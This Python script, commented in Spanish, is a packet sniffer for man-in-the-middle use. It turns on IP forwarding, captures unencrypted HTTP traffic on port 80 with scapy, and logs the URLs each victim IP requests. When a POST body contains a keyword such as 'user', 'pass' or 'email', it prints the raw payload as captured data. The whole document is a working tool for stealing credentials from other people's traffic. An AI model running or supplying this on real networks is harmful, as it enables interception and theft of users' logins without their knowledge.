#!/bin/python3

from scapy.all import *
from scapy.layers.http import HTTPRequest
from colorama import init, Fore
from os import getuid
from subprocess import call
import argparse

# ARGUMENTO - INTERFAZ
parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Interfaz a sniffear. Ejemplo: ./packetSniffer.py -i eth0")
options = parser.parse_args()

# COMPROBAR USUARIO ROOT Y FORWARDING ACTIVADO
if os.geteuid() != 0:
    print ("¡EJECUTA COMO ROOT!".center(100, "="))
    exit()
else:
    print ( "[+] Comprobando forwarding..." )
    call(['sysctl', '-w', 'net.ipv4.ip_forward=1'])

# CONFIGURACIÓN DE COLORAMA    
init()
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

def sniffData(interface):
    print ( f"{GREEN}Sniffing...{RESET}" )
    sniff(iface=interface, store=False, prn=processSniffedPackets, filter="port 80")

def processSniffedPackets(packet):
    if packet.haslayer(HTTPRequest):

        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[HTTPRequest].Method.decode()
        
        print(f"\n{GREEN}[+] {ip} pidió la URL {url} con el método {method}{RESET}")

        keywords = ["user", "username", "usr", "pass", "password", "pwd", "email", "mail"]
        if packet.haslayer(Raw) and method == "POST":
            for keyw in keywords:
                if keyw in str(packet[Raw].load):
                    print(f"\n{RED}[*] Datos capturados: {packet[Raw].load}{RESET}")
                else:
                    pass
sniffData(options.interface)
